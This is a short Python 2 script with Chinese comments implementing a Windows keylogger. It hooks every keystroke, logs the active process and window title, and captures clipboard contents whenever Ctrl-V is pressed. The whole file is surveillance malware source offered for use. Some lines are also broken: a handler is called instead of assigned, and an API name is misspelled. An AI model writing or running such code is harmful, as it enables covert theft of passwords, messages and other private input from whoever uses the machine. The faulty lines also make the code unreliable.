# !/usr/bin/env python
#  -*- coding: utf-8 -*-
__author__ = 'xy'

from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


def get_current_process():
    # 获得窗口句柄
    hwnd = user32.GetForegroundWindow()

    # 获得进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessID(hwnd, byref(pid))

    # 保存当前进程ID
    process_id = "%d" % pid.value

    # 申请内存
    executable = create_string_buffer("\x00" * 512)

    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseName(h_process, None, byref(executable), 512)

    # 读取窗口标题
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # 输出
    print "\n [ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)

    # 关闭句柄
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):

    global current_window

    # 检查目标是否切换窗口
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # 检测按键是否为常规键
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),

    else:
        # 如果输入为ctrl-v 则获取剪贴板内容
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print "[PASTE] - %s" % (pasted_value),

        else:
            print "[%s]" % event.Key,

    return True

# 创建和注册钩子函数管理器
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke()

# 注册键盘记录的钩子并永久执行
kl.HookKeyboard()
pythoncom.PumpMessages()
